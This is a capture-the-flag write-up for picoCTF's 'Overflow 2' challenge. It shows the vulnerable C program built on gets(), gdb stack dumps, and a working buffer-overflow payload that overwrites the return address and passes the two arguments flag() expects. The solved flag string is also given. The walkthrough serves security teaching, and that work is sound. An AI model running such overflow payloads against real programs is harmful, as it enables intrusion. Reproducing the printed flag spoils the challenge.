
# Binary Exploitation - Overflow 2 (250 points)

## Challenge

*Now try overwriting arguments. Can you get the flag from this [program](./vuln)? You can find it in /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446 on the shell server. [Source](./vuln.c).*

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Flag

picoCTF{arg5_and_r3turn51b106031}

## Walkthrough

This challenge is based on the same vulnerability than OverFlow 1 : the function void `void vuln()` is vulnerable to a buffer overflow because of a call to `gets()` (no boundaries).

```C
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
  [...]
}
```

But it's a little more complicated this time, because the function `void flag(unsigned int arg1, unsigned int arg2)` has to be called with two arguments with specific values:

```bash
void flag(unsigned int arg1, unsigned int arg2) {
  [...]
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}
```

Our overflow in `buf` will have two goals here:

* Set the return address of `void vuln()` to point to `void flag()`.
* Set the correct values for the two arguments of `void flag()` which have to be *0xDEADBEEF* and *0xC0DED00D*.

First let's get the start address of `void flag()` using gdb:

```bash
root@kali:~/Downloads# gdb ./vuln
[...]
(gdb) info functions
All defined functions:

Non-debugging symbols:
[...]
0x080485e6  flag
0x08048676  vuln
0x080486b5  main
[...]
```

So the return address has to be set to 0x080485e6.

Now, time to play a little with GDB to get the size ofour overflow:

```bash
root@kali:~/Downloads# gdb ./vuln
[...]]
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048676 <+0>:     push   %ebp
   0x08048677 <+1>:     mov    %esp,%ebp
   0x08048679 <+3>:     push   %ebx
   0x0804867a <+4>:     sub    $0xb4,%esp
   0x08048680 <+10>:    call   0x8048520 <__x86.get_pc_thunk.bx>
   0x08048685 <+15>:    add    $0x197b,%ebx
   0x0804868b <+21>:    sub    $0xc,%esp
   0x0804868e <+24>:    lea    -0xb8(%ebp),%eax
   0x08048694 <+30>:    push   %eax
   0x08048695 <+31>:    call   0x8048430 <gets@plt>
   0x0804869a <+36>:    add    $0x10,%esp
   0x0804869d <+39>:    sub    $0xc,%esp
   0x080486a0 <+42>:    lea    -0xb8(%ebp),%eax
   0x080486a6 <+48>:    push   %eax
   0x080486a7 <+49>:    call   0x8048460 <puts@plt>
   0x080486ac <+54>:    add    $0x10,%esp
   0x080486af <+57>:    nop
   0x080486b0 <+58>:    mov    -0x4(%ebp),%ebx
   0x080486b3 <+61>:    leave  
   0x080486b4 <+62>:    ret
End of assembler dump.
```

We are going to set a breakpoint just after the *gets()* call, and then display the stack content:

```bash
(gdb) break *0x0804869a
Breakpoint 1 at 0x804869a
(gdb) run <<< $(python -c "print('\x41\x41\x41\x41')")
Starting program: /root/Downloads/vuln <<< $(python -c "print('\x41\x41\x41\x41')")
Please enter your string:

Breakpoint 1, 0x0804869a in vuln ()
(gdb) x/100wx $esp
0xffffd240:     0xffffd250      0x08048831      0x0000001a      0x08048685
0xffffd250:     0x41414141      0xf7fb6f00      0x00000000      0x000007d4
0xffffd260:     0x0000001a      0xf7fb6f80      0xf7fb7640      0x00000001
0xffffd270:     0x0000000a      0xf7fb6000      0xffffd2f8      0xf7e56337
0xffffd280:     0xf7fb6d80      0x0000001a      0xf7fb6d80      0xf7e56723
0xffffd290:     0xf7fb6d80      0xf7fb6dc7      0x00000001      0x00000001
0xffffd2a0:     0x00000001      0x00000000      0xf7e570a9      0xf7fb7640
0xffffd2b0:     0x0000001a      0xf7fb6000      0xffffd2f8      0xf7e4b2db
0xffffd2c0:     0xf7fb6d80      0x0000000a      0x0000001a      0xf7ea235d
0xffffd2d0:     0x00000000      0xf7fb6e1c      0xf7fb6d80      0x0000001a
0xffffd2e0:     0xffffd328      0xf7fe9450      0x00000000      0x0804a000
0xffffd2f0:     0xf7fb6000      0xf7fb6000      0xffffd328      0x08048714
0xffffd300:     0x08048831      0x0804a000      0xffffd328      0x0804871c
0xffffd310:     0x00000001      0xffffd3d4      0xffffd3dc      0x00000000
```

*buf* starts at 0xffffd250, and our return address is at 0xffffd30c (because at this adress we found the address of the nextinstruction in *main()* right after *vuln()*). So we have to write (0xffffd30c - 0xffffd250) characters before the return address. Let's try it:

```bash
(gdb) run <<< $(python -c "print('\x41'*188 + '\xe6\x85\x04\x08')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Downloads/vuln <<< $(python -c "print('\x41'*188 + '\xe6\x85\x04\x08')")
Please enter your string:

Breakpoint 1, 0x0804869a in vuln ()
(gdb) x/100wx $esp
0xffffd240:     0xffffd250      0x08048831      0x0000001a      0x08048685
0xffffd250:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd260:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd270:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd280:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd290:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd300:     0x41414141      0x41414141      0x41414141      0x080485e6
[...]
```

It fits perfectly, and the return address is overwritten. Now, we just have to overwrite the arguments (without forgetting to add a 4 bytes padding to cover the return address just after the address we have overwritten):

```bash
(gdb) run <<< $(python -c "print('\x41'*188 + '\xe6\x85\x04\x08' + '\x41'*4 + '\xef\xbe\xad\xde\x0d\xd0\xde\xc0')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Downloads/vuln <<< $(python -c "print('\x41'*188 + '\xe6\x85\x04\x08' + '\x41'*4 + '\xef\xbe\xad\xde\x0d\xd0\xde\xc0')")
Please enter your string:

Breakpoint 1, 0x0804869a in vuln ()
(gdb) x/100wx $esp
0xffffd240:     0xffffd250      0x08048831      0x0000001a      0x08048685
0xffffd250:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd260:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd270:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd280:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd290:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd2f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd300:     0x41414141      0x41414141      0x41414141      0x080485e6
0xffffd310:     0x41414141      0xdeadbeef      0xc0ded00d      0x00000000
[...]
```

Memory speaking, everything seems good. Now in real conditions:

```bash
m3oow@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ (python -c "print('\x41'*188 + '\xe6\x85\x04\x08' + '\x41'*4 + '\xef\xbe\xad\xde\x0d\xd0\xde\xc0')"; cat -) | ./vuln
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}
Segmentation fault (core dumped)
```
